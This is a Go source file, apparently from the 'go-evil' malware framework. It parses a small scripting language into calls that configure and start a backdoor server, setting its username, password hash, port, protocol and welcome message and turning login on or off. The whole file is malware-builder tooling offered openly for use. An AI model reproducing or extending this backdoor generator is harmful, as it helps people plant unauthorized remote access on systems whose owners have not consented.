package backdoor

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(backdoor)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(backdoor)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("backdoor.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)

		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]

			switch subdomain {
			case "set":
				switch function {
				case "hash":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_hash(\"%s\")", value))
				case "user":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_username(\"%s\")", value))
				case "password":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_password(\"%s\")", value))
				case "port":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_port(\"%s\")", value))
				case "protocol":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_protocol(\"%s\")", value))
				case "welcome":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_welcome_msg(\"%s\")", value))
				case "read_size":
					data_structure.Append_malware_gut(fmt.Sprintf("back.Set_read_size(\"%s\")", value))
				default:
					error.Function_error(function, "backdoor.Parse()")
				}
			case "login":
				switch function {
				case "enable":
					data_structure.Append_malware_gut("back.Enable_login()")
				case "disable":
					data_structure.Append_malware_gut("back.Disable_login()")
				default:
					error.Function_error(function, "backdoor.Parse()")
				}
			default:
				error.Subdomain_error(subdomain, "backdoor.Parse()")
			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex = regexp.MustCompile(EXTRACT_FUNCTION)
			result = regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]
				switch function {
				case "start":
					data_structure.Append_malware_gut("back.Start()")
				case "serve":
					data_structure.Append_malware_gut("back.Serve()")
				case "stop":
					data_structure.Append_malware_gut("back.Close()")
				default:
					error.Function_error(function, "backdoor.Parse()")
				}
			}
		}
	}

	return json.Send(data_structure)
}
